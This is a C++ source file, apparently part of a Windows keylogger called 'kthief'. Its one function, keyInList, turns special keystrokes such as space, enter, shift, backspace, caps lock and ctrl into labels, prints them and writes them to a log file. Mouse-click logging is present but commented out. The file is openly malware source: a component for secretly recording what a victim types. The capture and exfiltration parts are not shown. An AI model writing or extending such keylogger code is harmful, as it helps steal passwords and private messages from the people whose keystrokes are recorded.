#include "kthief.h"
#include <iostream>
#include <windows.h>
#include <string>
#include "logger.h"

using namespace std;

bool kthief::keyInList(int key) {
    Sleep(165);
    switch (key){
        case VK_SPACE:
            cout << "*space* ";
            writeToLog("*space*");
            break;

        case VK_RETURN:
            cout << "*enter*\n";
            writeToLog("*enter*\n");
            break;

        case VK_SHIFT:
            cout << "*shift*";
            writeToLog("*shift*");
            break;

        case VK_BACK:
            cout << "*back*\b";
            writeToLog("*back*\b");
            break;

        case VK_CAPITAL:
            cout << "*capital*";
            writeToLog("*capital*");
            break;

        case VK_CONTROL:
            cout << "*ctrl*";
            writeToLog("*ctrl*");
            break;

//        case VK_RBUTTON:
//            cout << "*R_click*";
//            writeToLog("*R_click*");
//            break;
//
//        case VK_LBUTTON:
//            cout << "*L_click*";
//            writeToLog("*L_click*");
//            break;

        default:
            return false;
    }
    return true;
}

